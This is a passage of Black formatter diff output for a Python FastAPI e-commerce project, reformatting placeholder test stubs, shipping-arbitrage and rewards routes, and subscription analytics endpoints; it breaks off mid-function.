     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_app_factory_functionality(self):
         """Test app_factory specific functionality."""
         # TODO: Add app_factory functionality tests
         assert True
-    
+
     def test_application_bootstrap_integration(self):
         """Test integration with application bootstrap."""
         # TODO: Add bootstrap integration tests
         assert True
-    
+
     def test_configuration_loading(self):
         """Test configuration loading if applicable."""
         # TODO: Add configuration tests
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant implementations."""
         # TODO: Add redundancy compliance tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/app/test_app.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/revenue_routes.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/revenue_routes.py	2025-06-19 04:03:46.079949+00:00
@@ -20,11 +20,11 @@
 from fs_agt_clean.core.auth.auth_service import AuthService
 from fs_agt_clean.database.models.user import User
 from fs_agt_clean.services.shipping_arbitrage import shipping_arbitrage_service
 from fs_agt_clean.database.repositories.ai_analysis_repository import (
     RevenueCalculationRepository,
-    RewardsBalanceRepository
+    RewardsBalanceRepository,
 )
 
 logger = logging.getLogger(__name__)
 
 # Initialize router
@@ -35,39 +35,52 @@
 rewards_repository = RewardsBalanceRepository()
 
 
 class ShippingCalculationRequest(BaseModel):
     """Request model for shipping cost calculation."""
+
     origin_zip: str = Field(..., description="Origin ZIP code")
     destination_zip: str = Field(..., description="Destination ZIP code")
     weight: float = Field(..., gt=0, description="Package weight in pounds")
-    package_type: str = Field(default="standard", description="Package type: standard, express, overnight")
-    current_carrier: Optional[str] = Field(default=None, description="Current shipping carrier")
-    current_rate: Optional[float] = Field(default=None, description="Current shipping rate")
+    package_type: str = Field(
+        default="standard", description="Package type: standard, express, overnight"
+    )
+    current_carrier: Optional[str] = Field(
+        default=None, description="Current shipping carrier"
+    )
+    current_rate: Optional[float] = Field(
+        default=None, description="Current shipping rate"
+    )
 
 
 class BulkShippingRequest(BaseModel):
     """Request model for bulk shipping optimization."""
+
     shipments: List[Dict[str, Any]] = Field(..., description="List of shipment data")
-    optimization_criteria: str = Field(default="cost", description="Optimization criteria: cost, speed, balance")
+    optimization_criteria: str = Field(
+        default="cost", description="Optimization criteria: cost, speed, balance"
+    )
 
 
 class RewardsEarningRequest(BaseModel):
     """Request model for adding rewards earnings."""
+
     amount: float = Field(..., gt=0, description="Earnings amount")
     source: str = Field(..., description="Source of earnings")
-    metadata: Optional[Dict[str, Any]] = Field(default=None, description="Additional metadata")
+    metadata: Optional[Dict[str, Any]] = Field(
+        default=None, description="Additional metadata"
+    )
 
 
 @router.post("/shipping/calculate")
 async def calculate_shipping_arbitrage(
     request: ShippingCalculationRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Calculate shipping arbitrage opportunities for cost optimization.
-    
+
     This endpoint:
     - Compares rates across multiple carriers
     - Identifies cost savings opportunities
     - Provides optimization recommendations
     - Tracks savings for revenue calculation
@@ -78,169 +91,182 @@
             origin_zip=request.origin_zip,
             destination_zip=request.destination_zip,
             weight=request.weight,
             package_type=request.package_type,
             current_carrier=request.current_carrier,
-            current_rate=request.current_rate
-        )
-        
+            current_rate=request.current_rate,
+        )
+
         # Track savings if applicable
-        if request.current_rate and "savings" in arbitrage_result and arbitrage_result["savings"]:
+        if (
+            request.current_rate
+            and "savings" in arbitrage_result
+            and arbitrage_result["savings"]
+        ):
             savings_data = arbitrage_result["savings"]
             if savings_data["savings_amount"] > 0:
                 # Track the savings
                 tracking_result = await shipping_arbitrage_service.track_savings(
                     user_id=UUID(str(current_user.id)),
                     original_cost=savings_data["original_rate"],
                     optimized_cost=savings_data["optimized_rate"],
                     optimization_method="carrier_comparison",
                     carrier_recommendations=arbitrage_result.get("carrier_rates", {}),
-                    product_id=None
+                    product_id=None,
                 )
                 arbitrage_result["savings_tracked"] = tracking_result
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "arbitrage_result": arbitrage_result,
-                "calculated_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "calculated_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error calculating shipping arbitrage: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Calculation failed: {str(e)}"
+            detail=f"Calculation failed: {str(e)}",
         )
 
 
 @router.post("/shipping/optimize-bulk")
 async def optimize_bulk_shipping(
     request: BulkShippingRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Optimize shipping costs for multiple shipments.
-    
+
     This endpoint:
     - Processes multiple shipments at once
     - Applies bulk optimization strategies
     - Calculates total cost savings
     - Provides consolidated recommendations
     """
     try:
         # Optimize shipping for all shipments
         optimization_result = await shipping_arbitrage_service.optimize_shipping(
             shipments=request.shipments,
-            optimization_criteria=request.optimization_criteria
-        )
-        
+            optimization_criteria=request.optimization_criteria,
+        )
+
         # Track bulk savings if applicable
         summary = optimization_result.get("optimization_summary", {})
         if summary.get("total_savings", 0) > 0:
             tracking_result = await shipping_arbitrage_service.track_savings(
                 user_id=UUID(str(current_user.id)),
                 original_cost=summary["total_original_cost"],
                 optimized_cost=summary["total_optimized_cost"],
                 optimization_method=f"bulk_optimization_{request.optimization_criteria}",
-                carrier_recommendations={"bulk_optimization": True, "shipment_count": len(request.shipments)},
-                product_id=None
+                carrier_recommendations={
+                    "bulk_optimization": True,
+                    "shipment_count": len(request.shipments),
+                },
+                product_id=None,
             )
             optimization_result["savings_tracked"] = tracking_result
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "optimization_result": optimization_result,
-                "optimized_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "optimized_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error optimizing bulk shipping: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Optimization failed: {str(e)}"
+            detail=f"Optimization failed: {str(e)}",
         )
 
 
 @router.get("/arbitrage/history")
 async def get_arbitrage_history(
     limit: int = Query(20, ge=1, le=100, description="Number of records to return"),
     offset: int = Query(0, ge=0, description="Number of records to skip"),
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get user's shipping arbitrage history and savings.
-    
+
     This endpoint returns:
     - Historical arbitrage calculations
     - Total savings achieved
     - Optimization trends
     - Performance metrics
     """
     try:
         # Get user's savings history
         savings_history = await revenue_repository.get_user_savings_history(
-            user_id=UUID(str(current_user.id)),
-            limit=limit
-        )
-        
+            user_id=UUID(str(current_user.id)), limit=limit
+        )
+
         # Calculate total savings
         total_savings = await revenue_repository.get_total_user_savings(
             user_id=UUID(str(current_user.id))
         )
-        
+
         # Format history data
         history_data = []
         for calculation in savings_history:
-            history_data.append({
-                "id": str(calculation.id),
-                "original_cost": float(calculation.original_shipping_cost),
-                "optimized_cost": float(calculation.optimized_shipping_cost),
-                "savings_amount": float(calculation.savings_amount),
-                "savings_percentage": float(calculation.savings_percentage),
-                "optimization_method": calculation.optimization_method,
-                "created_at": calculation.created_at.isoformat()
-            })
-        
+            history_data.append(
+                {
+                    "id": str(calculation.id),
+                    "original_cost": float(calculation.original_shipping_cost),
+                    "optimized_cost": float(calculation.optimized_shipping_cost),
+                    "savings_amount": float(calculation.savings_amount),
+                    "savings_percentage": float(calculation.savings_percentage),
+                    "optimization_method": calculation.optimization_method,
+                    "created_at": calculation.created_at.isoformat(),
+                }
+            )
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "arbitrage_history": {
                     "calculations": history_data,
                     "total_calculations": len(history_data),
                     "total_savings": total_savings,
-                    "average_savings": sum(float(calc.savings_amount) for calc in savings_history) / len(savings_history) if savings_history else 0
+                    "average_savings": (
+                        sum(float(calc.savings_amount) for calc in savings_history)
+                        / len(savings_history)
+                        if savings_history
+                        else 0
+                    ),
                 },
-                "retrieved_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "retrieved_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error retrieving arbitrage history: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve history: {str(e)}"
+            detail=f"Failed to retrieve history: {str(e)}",
         )
 
 
 @router.post("/optimization/track")
 async def track_optimization_savings(
     original_cost: float = Query(..., gt=0, description="Original cost"),
     optimized_cost: float = Query(..., gt=0, description="Optimized cost"),
     optimization_method: str = Query(..., description="Method used for optimization"),
     product_id: Optional[str] = Query(None, description="Product ID if applicable"),
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Track cost optimization savings for revenue calculation.
-    
+
     This endpoint:
     - Records optimization savings
     - Updates user's total savings
     - Provides savings analytics
     - Contributes to revenue tracking
@@ -251,38 +277,37 @@
             user_id=UUID(str(current_user.id)),
             original_cost=original_cost,
             optimized_cost=optimized_cost,
             optimization_method=optimization_method,
             carrier_recommendations={"manual_tracking": True},
-            product_id=UUID(product_id) if product_id else None
-        )
-        
+            product_id=UUID(product_id) if product_id else None,
+        )
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "tracking_result": tracking_result,
-                "tracked_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "tracked_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error tracking optimization savings: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Tracking failed: {str(e)}"
+            detail=f"Tracking failed: {str(e)}",
         )
 
 
 @router.get("/rewards/balance/{user_id}")
 async def get_rewards_balance(
-    user_id: str,
-    current_user: User = Depends(AuthService.get_current_user)
+    user_id: str, current_user: User = Depends(AuthService.get_current_user)
 ):
     """
     Get user's rewards balance and earning history.
-    
+
     This endpoint returns:
     - Current rewards balance
     - Lifetime earnings and redemptions
     - Earning sources breakdown
     - Redemption history
@@ -290,66 +315,66 @@
     try:
         # Verify user access (users can only access their own balance or admins can access any)
         if str(current_user.id) != user_id and current_user.role != "admin":
             raise HTTPException(
                 status_code=status.HTTP_403_FORBIDDEN,
-                detail="Access denied: Can only view your own rewards balance"
+                detail="Access denied: Can only view your own rewards balance",
             )
-        
+
         # Get rewards balance
         balance = await rewards_repository.get_user_balance(UUID(user_id))
-        
+
         if not balance:
             # Create initial balance record
             balance = await rewards_repository.create_or_update_balance(
                 user_id=UUID(user_id),
                 current_balance=0.0,
                 lifetime_earned=0.0,
                 lifetime_redeemed=0.0,
                 redemption_history={},
-                earning_sources={}
+                earning_sources={},
             )
-        
+
         # Format balance data
         balance_data = {
             "user_id": user_id,
             "current_balance": float(balance.current_balance),
             "lifetime_earned": float(balance.lifetime_earned),
             "lifetime_redeemed": float(balance.lifetime_redeemed),
             "redemption_history": balance.redemption_history or {},
             "earning_sources": balance.earning_sources or {},
             "last_updated": balance.last_updated.isoformat(),
-            "created_at": balance.created_at.isoformat()
+            "created_at": balance.created_at.isoformat(),
         }
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "rewards_balance": balance_data,
-                "retrieved_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "retrieved_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error retrieving rewards balance: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve balance: {str(e)}"
+            detail=f"Failed to retrieve balance: {str(e)}",
         )
 
 
 @router.post("/rewards/earn")
 async def add_rewards_earnings(
     request: RewardsEarningRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Add earnings to user's rewards balance.
-    
+
     This endpoint:
     - Adds earnings from various sources
     - Updates lifetime earnings
     - Tracks earning sources
     - Provides earning confirmation
@@ -358,33 +383,33 @@
         # Add earnings to user's balance
         updated_balance = await rewards_repository.add_earnings(
             user_id=UUID(str(current_user.id)),
             amount=request.amount,
             source=request.source,
-            metadata=request.metadata or {}
-        )
-        
+            metadata=request.metadata or {},
+        )
+
         # Format response
         earning_result = {
             "earning_id": str(updated_balance.id),
             "amount_earned": request.amount,
             "source": request.source,
             "new_balance": float(updated_balance.current_balance),
             "lifetime_earned": float(updated_balance.lifetime_earned),
-            "earned_at": updated_balance.last_updated.isoformat()
+            "earned_at": updated_balance.last_updated.isoformat(),
         }
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "earning_result": earning_result,
-                "processed_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "processed_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error adding rewards earnings: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to add earnings: {str(e)}"
-        )
+            detail=f"Failed to add earnings: {str(e)}",
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/revenue_routes.py
--- /home/brend/Flipsync_Final/fs_agt_clean/app/test_feature_flags.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/app/test_feature_flags.py	2025-06-19 04:03:46.204378+00:00
@@ -9,35 +9,37 @@
 from pathlib import Path
 
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
+
 class TestFeatureFlags:
     """Test class for feature_flags."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_utility_module_functionality(self):
         """Test utility_module specific functionality."""
         # TODO: Add utility_module functionality tests
         assert True
-    
+
     def test_application_bootstrap_integration(self):
         """Test integration with application bootstrap."""
         # TODO: Add bootstrap integration tests
         assert True
-    
+
     def test_configuration_loading(self):
         """Test configuration loading if applicable."""
         # TODO: Add configuration tests
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant implementations."""
         # TODO: Add redundancy compliance tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/app/test_feature_flags.py
--- /home/brend/Flipsync_Final/fs_agt_clean/app/test_main.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/app/test_main.py	2025-06-19 04:03:46.293230+00:00
@@ -9,35 +9,37 @@
 from pathlib import Path
 
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
+
 class TestMain:
     """Test class for main."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_main_entry_point_functionality(self):
         """Test main_entry_point specific functionality."""
         # TODO: Add main_entry_point functionality tests
         assert True
-    
+
     def test_application_bootstrap_integration(self):
         """Test integration with application bootstrap."""
         # TODO: Add bootstrap integration tests
         assert True
-    
+
     def test_configuration_loading(self):
         """Test configuration loading if applicable."""
         # TODO: Add configuration tests
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant implementations."""
         # TODO: Add redundancy compliance tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/app/test_main.py
--- /home/brend/Flipsync_Final/fs_agt_clean/config/test_env_handler.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/config/test_env_handler.py	2025-06-19 04:03:46.372205+00:00
@@ -9,35 +9,37 @@
 from pathlib import Path
 
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
+
 class TestEnvHandler:
     """Test class for env_handler."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_constants_functionality(self):
         """Test constants specific functionality."""
         # TODO: Add constants functionality tests
         assert True
-    
+
     def test_application_bootstrap_integration(self):
         """Test integration with application bootstrap."""
         # TODO: Add bootstrap integration tests
         assert True
-    
+
     def test_configuration_loading(self):
         """Test configuration loading if applicable."""
         # TODO: Add configuration tests
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant implementations."""
         # TODO: Add redundancy compliance tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/config/test_env_handler.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/subscription/enhanced_subscription_routes.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/subscription/enhanced_subscription_routes.py	2025-06-19 04:03:46.352344+00:00
@@ -17,477 +17,501 @@
 from pydantic import BaseModel, Field
 
 from fs_agt_clean.core.auth.auth_service import AuthService
 from fs_agt_clean.database.models.user import User
 from fs_agt_clean.services.subscription.enhanced_subscription_service import (
-    enhanced_subscription_service, FeatureType, SubscriptionTier
+    enhanced_subscription_service,
+    FeatureType,
+    SubscriptionTier,
 )
-from fs_agt_clean.services.subscription.usage_analytics_service import usage_analytics_service
+from fs_agt_clean.services.subscription.usage_analytics_service import (
+    usage_analytics_service,
+)
 
 logger = logging.getLogger(__name__)
 
 # Initialize router
 router = APIRouter(prefix="/subscription", tags=["enhanced-subscription"])
 
 
 class FeatureAccessRequest(BaseModel):
     """Request model for feature access check."""
+
     feature_type: str = Field(..., description="Feature type to check")
     subscription_tier: str = Field(..., description="User's subscription tier")
 
 
 class UsageTrackingRequest(BaseModel):
     """Request model for usage tracking."""
+
     feature_type: str = Field(..., description="Feature type used")
     subscription_tier: str = Field(..., description="User's subscription tier")
-    metadata: Optional[Dict[str, Any]] = Field(default=None, description="Additional metadata")
+    metadata: Optional[Dict[str, Any]] = Field(
+        default=None, description="Additional metadata"
+    )
 
 
 class FeatureAccessResponse(BaseModel):
     """Response model for feature access check."""
+
     has_access: bool
     access_info: Dict[str, Any]
 
 
 class UsageAnalyticsResponse(BaseModel):
     """Response model for usage analytics."""
+
     user_id: str
     analytics: Dict[str, Any]
     generated_at: str
 
 
 class SubscriptionPlansResponse(BaseModel):
     """Response model for subscription plans."""
+
     plans: Dict[str, Any]
     current_tier: Optional[str]
     recommendations: List[Dict[str, Any]]
 
 
 @router.post("/check-access", response_model=FeatureAccessResponse)
 async def check_feature_access(
     request: FeatureAccessRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Check if user has access to a specific feature.
-    
+
     This endpoint:
     - Validates feature access based on subscription tier
     - Returns current usage and limits
     - Provides access status and recommendations
     - Enforces tier-based feature restrictions
     """
     try:
-        logger.info(f"Checking feature access for user {current_user.id}: {request.feature_type}")
-        
+        logger.info(
+            f"Checking feature access for user {current_user.id}: {request.feature_type}"
+        )
+
         # Validate feature type
         try:
             feature_type = FeatureType(request.feature_type)
         except ValueError:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail=f"Invalid feature type: {request.feature_type}"
-            )
-        
+                detail=f"Invalid feature type: {request.feature_type}",
+            )
+
         # Validate subscription tier
         try:
             subscription_tier = SubscriptionTier(request.subscription_tier)
         except ValueError:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail=f"Invalid subscription tier: {request.subscription_tier}"
-            )
-        
+                detail=f"Invalid subscription tier: {request.subscription_tier}",
+            )
+
         # Check feature access
-        has_access, access_info = await enhanced_subscription_service.check_feature_access(
-            user_id=str(current_user.id),
-            feature_type=feature_type,
-            subscription_tier=subscription_tier
-        )
-        
-        return FeatureAccessResponse(
-            has_access=has_access,
-            access_info=access_info
-        )
-        
+        has_access, access_info = (
+            await enhanced_subscription_service.check_feature_access(
+                user_id=str(current_user.id),
+                feature_type=feature_type,
+                subscription_tier=subscription_tier,
+            )
+        )
+
+        return FeatureAccessResponse(has_access=has_access, access_info=access_info)
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error checking feature access: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Feature access check failed: {str(e)}"
+            detail=f"Feature access check failed: {str(e)}",
         )
 
 
 @router.post("/track-usage")
 async def track_feature_usage(
     request: UsageTrackingRequest,
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Track feature usage for a user.
-    
+
     This endpoint:
     - Records feature usage for analytics
     - Updates usage counters and limits
     - Provides usage tracking for billing
     - Enables usage-based recommendations
     """
     try:
-        logger.info(f"Tracking usage for user {current_user.id}: {request.feature_type}")
-        
+        logger.info(
+            f"Tracking usage for user {current_user.id}: {request.feature_type}"
+        )
+
         # Validate feature type
         try:
             feature_type = FeatureType(request.feature_type)
         except ValueError:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail=f"Invalid feature type: {request.feature_type}"
-            )
-        
+                detail=f"Invalid feature type: {request.feature_type}",
+            )
+
         # Validate subscription tier
         try:
             subscription_tier = SubscriptionTier(request.subscription_tier)
         except ValueError:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail=f"Invalid subscription tier: {request.subscription_tier}"
-            )
-        
+                detail=f"Invalid subscription tier: {request.subscription_tier}",
+            )
+
         # Track usage
         success = await enhanced_subscription_service.track_feature_usage(
             user_id=str(current_user.id),
             feature_type=feature_type,
             subscription_tier=subscription_tier,
-            metadata=request.metadata
-        )
-        
+            metadata=request.metadata,
+        )
+
         if success:
             return JSONResponse(
                 status_code=status.HTTP_200_OK,
                 content={
                     "success": True,
                     "message": "Usage tracked successfully",
                     "feature_type": request.feature_type,
-                    "tracked_at": datetime.now(timezone.utc).isoformat()
-                }
+                    "tracked_at": datetime.now(timezone.utc).isoformat(),
+                },
             )
         else:
             raise HTTPException(
                 status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-                detail="Failed to track usage"
-            )
-        
+                detail="Failed to track usage",
+            )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error tracking usage: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Usage tracking failed: {str(e)}"
+            detail=f"Usage tracking failed: {str(e)}",
         )
 
 
 @router.get("/plans", response_model=SubscriptionPlansResponse)
 async def get_subscription_plans(
-    current_tier: Optional[str] = Query(default=None, description="Current subscription tier"),
-    current_user: User = Depends(AuthService.get_current_user)
+    current_tier: Optional[str] = Query(
+        default=None, description="Current subscription tier"
+    ),
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get available subscription plans with recommendations.
-    
+
     This endpoint:
     - Returns all available subscription plans
     - Provides feature comparisons and pricing
     - Includes upgrade recommendations based on usage
     - Shows tier-specific benefits and limits
     """
     try:
         logger.info(f"Getting subscription plans for user {current_user.id}")
-        
+
         # Get all subscription plans
         plans = enhanced_subscription_service.get_subscription_plans()
-        
+
         # Get upgrade recommendations if current tier provided
         recommendations = []
         if current_tier:
             try:
                 tier = SubscriptionTier(current_tier)
-                recommendations = await enhanced_subscription_service.get_upgrade_suggestions(
-                    user_id=str(current_user.id),
-                    current_tier=tier
+                recommendations = (
+                    await enhanced_subscription_service.get_upgrade_suggestions(
+                        user_id=str(current_user.id), current_tier=tier
+                    )
                 )
             except ValueError:
                 logger.warning(f"Invalid current tier provided: {current_tier}")
-        
+
         return SubscriptionPlansResponse(
-            plans=plans,
-            current_tier=current_tier,
-            recommendations=recommendations
-        )
-        
+            plans=plans, current_tier=current_tier, recommendations=recommendations
+        )
+
     except Exception as e:
         logger.error(f"Error getting subscription plans: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve subscription plans: {str(e)}"
+            detail=f"Failed to retrieve subscription plans: {str(e)}",
         )
 
 
 @router.get("/analytics/usage", response_model=UsageAnalyticsResponse)
 async def get_usage_analytics(
-    feature_type: Optional[str] = Query(default=None, description="Specific feature to analyze"),
-    days: int = Query(default=30, ge=1, le=365, description="Number of days to analyze"),
-    current_user: User = Depends(AuthService.get_current_user)
+    feature_type: Optional[str] = Query(
+        default=None, description="Specific feature to analyze"
+    ),
+    days: int = Query(
+        default=30, ge=1, le=365, description="Number of days to analyze"
+    ),
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get detailed usage analytics for a user.
-    
+
     This endpoint:
     - Provides usage pattern analysis
     - Shows feature adoption metrics
     - Includes usage trends and insights
     - Offers optimization recommendations
     """
     try:
         logger.info(f"Getting usage analytics for user {current_user.id}")
-        
+
         # Validate feature type if provided
         feature_type_enum = None
         if feature_type:
             try:
                 feature_type_enum = FeatureType(feature_type)
             except ValueError:
                 raise HTTPException(
                     status_code=status.HTTP_400_BAD_REQUEST,
-                    detail=f"Invalid feature type: {feature_type}"
+                    detail=f"Invalid feature type: {feature_type}",
                 )
-        
+
         # Get usage analytics
         analytics = await usage_analytics_service.analyze_usage_patterns(
-            user_id=str(current_user.id),
-            feature_type=feature_type_enum,
-            days=days
-        )
-        
+            user_id=str(current_user.id), feature_type=feature_type_enum, days=days
+        )
+
         return UsageAnalyticsResponse(
             user_id=str(current_user.id),
             analytics=analytics,
-            generated_at=datetime.now(timezone.utc).isoformat()
-        )
-        
+            generated_at=datetime.now(timezone.utc).isoformat(),
+        )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error getting usage analytics: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Usage analytics failed: {str(e)}"
+            detail=f"Usage analytics failed: {str(e)}",
         )
 
 
 @router.get("/analytics/cost-optimization")
 async def get_cost_optimization(
     current_tier: str = Query(..., description="Current subscription tier"),
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get cost optimization recommendations.
-    
+
     This endpoint:
     - Analyzes current usage vs subscription tier
     - Provides cost optimization suggestions
     - Identifies potential savings opportunities
     - Recommends optimal tier based on usage
     """
     try:
         logger.info(f"Getting cost optimization for user {current_user.id}")
-        
+
         # Validate subscription tier
         try:
             tier = SubscriptionTier(current_tier)
         except ValueError:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail=f"Invalid subscription tier: {current_tier}"
-            )
-        
+                detail=f"Invalid subscription tier: {current_tier}",
+            )
+
         # Get cost optimization recommendations
-        recommendations = await usage_analytics_service.get_cost_optimization_recommendations(
-            user_id=str(current_user.id),
-            current_tier=tier
-        )
-        
+        recommendations = (
+            await usage_analytics_service.get_cost_optimization_recommendations(
+                user_id=str(current_user.id), current_tier=tier
+            )
+        )
+
         # Format recommendations
         formatted_recommendations = []
         for rec in recommendations:
-            formatted_recommendations.append({
-                "current_cost": float(rec.current_cost),
-                "optimized_cost": float(rec.optimized_cost),
-                "savings": float(rec.savings),
-                "recommendation": rec.recommendation,
-                "confidence": rec.confidence
-            })
-        
+            formatted_recommendations.append(
+                {
+                    "current_cost": float(rec.current_cost),
+                    "optimized_cost": float(rec.optimized_cost),
+                    "savings": float(rec.savings),
+                    "recommendation": rec.recommendation,
+                    "confidence": rec.confidence,
+                }
+            )
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "user_id": str(current_user.id),
                 "current_tier": current_tier,
                 "recommendations": formatted_recommendations,
-                "total_potential_savings": sum(float(rec.savings) for rec in recommendations),
-                "generated_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "total_potential_savings": sum(
+                    float(rec.savings) for rec in recommendations
+                ),
+                "generated_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error getting cost optimization: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Cost optimization failed: {str(e)}"
+            detail=f"Cost optimization failed: {str(e)}",
         )
 
 
 @router.get("/analytics/billing-forecast")
 async def get_billing_forecast(
     current_tier: str = Query(..., description="Current subscription tier"),
-    months: int = Query(default=12, ge=1, le=24, description="Number of months to forecast"),
-    current_user: User = Depends(AuthService.get_current_user)
+    months: int = Query(
+        default=12, ge=1, le=24, description="Number of months to forecast"
+    ),
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get billing forecast based on usage trends.
-    
+
     This endpoint:
     - Projects future costs based on usage patterns
     - Identifies potential tier changes needed
     - Provides annual cost estimates
     - Shows potential savings opportunities
     """
     try:
         logger.info(f"Getting billing forecast for user {current_user.id}")
-        
+
         # Validate subscription tier
         try:
             tier = SubscriptionTier(current_tier)
         except ValueError:
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail=f"Invalid subscription tier: {current_tier}"
-            )
-        
+                detail=f"Invalid subscription tier: {current_tier}",
+            )
+
         # Get billing forecast
         forecast = await usage_analytics_service.get_billing_forecast(
-            user_id=str(current_user.id),
-            current_tier=tier,
-            months=months
-        )
-        
+            user_id=str(current_user.id), current_tier=tier, months=months
+        )
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
